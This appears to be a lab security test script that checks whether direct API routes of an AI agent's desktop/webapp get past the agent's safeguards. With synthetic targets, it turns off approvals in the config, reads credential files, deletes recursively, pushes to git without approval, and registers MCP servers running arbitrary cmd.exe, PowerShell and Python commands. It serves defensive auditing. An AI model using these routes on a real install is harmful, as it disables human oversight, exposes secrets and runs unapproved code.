"""T2: direct Desktop/Webapp routes versus the agent's protections. LAB gateway only, lab credential, synthetic targets only.
A route that SUCCEEDS where the agent's guard would refuse is recorded as BYPASS (by design for a signed-in user, but unprotected)."""
import json
import os
import shutil
import subprocess
import sys
import time

import httpx

LAB = r'F:\Odysseus-Backups\desktop-lab'
BASE = 'http://127.0.0.1:19120'
H = {'X-Hermes-Session-Token': open(LAB + r'\home\webapp\session-token').read().strip()}
OUT, SAFE, HOME, REPO, BARE = LAB + r'\work\outside', LAB + r'\work\safe', LAB + r'\home', LAB + r'\repos\work', LAB + r'\repos\bare.git'
GIT = r'C:\Program Files\Git\cmd\git.exe'
rows = []


def call(method, path, **kw):
    try:
        r = httpx.request(method, BASE + path, headers=H, timeout=40, **kw)
        try:
            body = r.json()
        except ValueError:
            body = r.text[:200]
        return r.status_code, body
    except Exception as exc:
        return type(exc).__name__, str(exc)[:100]


def rec(name, guard_would, outcome, evidence, note=''):
    rows.append({'test': name, 'agent_guard_would': guard_would, 'direct_route_outcome': outcome, 'evidence': evidence, 'note': note})
    print(f'{outcome:12} {name:58} (agent guard: {guard_would})  {evidence} {note}')


def exists(p):
    return os.path.exists(p)


# fixtures that only this test creates
open(HOME + r'\.env', 'w').write('SYNTHETIC_API_KEY=lab-secret-not-real\n')
open(HOME + r'\auth.json', 'w').write('{"synthetic": "lab-token-not-real"}\n')
shutil.copy(HOME + r'\config.yaml', LAB + r'\results\config.yaml.lab-original')

# ---- writes
code, body = call('POST', '/api/fs/write-text', json={'path': OUT + r'\direct-write.txt', 'content': 'written by the direct route'})
rec('fs/write-text OUTSIDE the safe root (create)', 'REFUSE (not under HERMES_WRITE_SAFE_ROOT)', 'BYPASS' if exists(OUT + r'\direct-write.txt') else f'refused {code}', f'http {code}', str(body)[:60])
open(OUT + r'\existing.txt', 'w').write('original')
code, body = call('POST', '/api/fs/write-text', json={'path': OUT + r'\existing.txt', 'content': 'OVERWRITTEN'})
rec('fs/write-text OUTSIDE the safe root (overwrite)', 'REFUSE', 'BYPASS' if open(OUT + r'\existing.txt').read() == 'OVERWRITTEN' else f'refused {code}', f'http {code}')
code, body = call('POST', '/api/fs/write-text', json={'path': SAFE + r'\secrets\prod.env', 'content': 'OVERWRITTEN'})
rec('fs/write-text onto a NEVER-ALLOW path', 'REFUSE (never-allow list)', 'BYPASS' if open(SAFE + r'\secrets\prod.env').read() == 'OVERWRITTEN' else f'refused {code}', f'http {code}')
code, body = call('POST', '/api/fs/write-text', json={'path': HOME + r'\config.yaml', 'content': 'approvals:\n  mode: off\ncommand_allowlist:\n  - execute_code\n'})
changed = open(HOME + r'\config.yaml').read().startswith('approvals:\n  mode: off')
rec('fs/write-text onto the Hermes config.yaml (security settings)', 'REFUSE (outside safe root / protected)', 'BYPASS' if changed else f'refused {code}', f'http {code}', 'approvals.mode could be set to off')
shutil.copy(LAB + r'\results\config.yaml.lab-original', HOME + r'\config.yaml')
os.makedirs(HOME + r'\plugins\evil', exist_ok=True)
code, body = call('POST', '/api/fs/write-text', json={'path': HOME + r'\plugins\evil\plugin.yaml', 'content': 'name: evil\n'})
rec('fs/write-text creating a file in the Hermes plugins folder', 'REFUSE', 'BYPASS' if exists(HOME + r'\plugins\evil\plugin.yaml') else f'refused {code}', f'http {code}')
code, body = call('POST', '/api/files/mkdir', json={'path': OUT + r'\made-by-route'})
rec('files/mkdir outside the safe root', 'REFUSE', 'BYPASS' if exists(OUT + r'\made-by-route') else f'refused {code}', f'http {code}', str(body)[:50])
# ---- delete
code, body = call('DELETE', '/api/files', json={'path': SAFE + r'\victim', 'recursive': True})
rec('DELETE /api/files recursive on a folder', 'ASK/BLOCK (recursive delete)', 'BYPASS' if not exists(SAFE + r'\victim') else f'refused {code}', f'http {code}', str(body)[:60])
code, body = call('DELETE', '/api/files', json={'path': OUT + r'\existing.txt'})
rec('DELETE /api/files outside the safe root', 'REFUSE', 'BYPASS' if not exists(OUT + r'\existing.txt') else f'refused {code}', f'http {code}')
# ---- reads of credential-like files
for name, p in (('HOME .env', HOME + r'\.env'), ('HOME auth.json', HOME + r'\auth.json'), ('webapp session-token file', HOME + r'\webapp\session-token')):
    code, body = call('GET', '/api/fs/read-text', params={'path': p})
    leaked = code == 200 and (('lab-secret' in json.dumps(body)) or ('lab-token' in json.dumps(body)) or len(json.dumps(body)) > 80)
    rec(f'fs/read-text of {name}', 'REFUSE (credential file)', 'LEAKS' if leaked else f'refused {code}', f'http {code}')
# ---- git: stage, commit and PUSH with no approval
open(REPO + r'\direct.txt', 'w').write('x')
code, body = call('POST', '/api/git/review/stage', json={'path': REPO, 'files': ['direct.txt']}) if False else (None, None)
subprocess.run([GIT, '-C', REPO, 'add', 'direct.txt'], capture_output=True)
before = subprocess.run([GIT, '-C', BARE, 'rev-parse', '--short', 'HEAD'], capture_output=True, text=True).stdout.strip() or '(empty)'
code, body = call('POST', '/api/git/review/commit', json={'path': REPO, 'message': 'direct commit', 'push': True})
time.sleep(1)
after = subprocess.run([GIT, '-C', BARE, 'rev-parse', '--short', 'HEAD'], capture_output=True, text=True).stdout.strip() or '(empty)'
rec('git/review/commit with push=true (remote updated)', 'ASK (git push is not on the read-only list)', 'BYPASS' if after != before else f'refused {code}', f'http {code}; bare repo {before} -> {after}', str(body)[:60])
# ---- MCP: add a server whose command is attacker-chosen, then "test" it (spawns the process)
marker_script = LAB + r'\tools\mcp_marker.py'
open(marker_script, 'w').write("import os\nopen(r'%s\\mcp-direct-marker.txt','w').write('command ran via /api/mcp/servers test')\n" % OUT)
PY = r'C:\Users\Protagonist\AppData\Local\hermes\installs\562e58e2ea9aca80\environments\6eff8cc60cb848909fbabec0b09c88c2\venv\Scripts\python.exe'
code, body = call('POST', '/api/mcp/servers', json={'name': 'labmarker', 'command': PY, 'args': [marker_script]})
rec('POST /api/mcp/servers with an arbitrary command', 'n/a (config change, no approval gate)', 'ACCEPTED' if code == 200 else f'refused {code}', f'http {code}', str(body)[:70])
code2, body2 = call('POST', '/api/mcp/servers/labmarker/test')
time.sleep(3)
rec('POST /api/mcp/servers/labmarker/test spawns that command', 'ASK/BLOCK for shell-like execution', 'EXECUTED' if exists(OUT + r'\mcp-direct-marker.txt') else f'not run ({code2})', f'http {code2}', str(body2)[:60])
for label, cmd, args in (('cmd.exe /c ...', 'cmd.exe', ['/c', 'echo hi > ' + OUT + r'\mcp-cmd.txt']),
                         ('powershell -Command ...', 'powershell', ['-Command', 'Set-Content ' + OUT + r'\mcp-ps.txt hi']),
                         ('python -c ...', PY, ['-c', f"open(r'{OUT}\\mcp-pyc.txt','w').write('x')"])):
    code, body = call('POST', '/api/mcp/servers', json={'name': 'lab' + label.split()[0].replace('.', '')[:6], 'command': cmd, 'args': args})
    rec(f'POST /api/mcp/servers command: {label}', 'n/a', 'ACCEPTED' if code == 200 else f'refused {code}', f'http {code}', str(body)[:70])
call('DELETE', '/api/mcp/servers/labmarker')
json.dump(rows, open(LAB + r'\results\T2-direct-routes.json', 'w'), indent=1)
print('\nBYPASS/LEAK/EXECUTED/ACCEPTED count:', sum(r['direct_route_outcome'] in ('BYPASS', 'LEAKS', 'EXECUTED', 'ACCEPTED') for r in rows), 'of', len(rows))
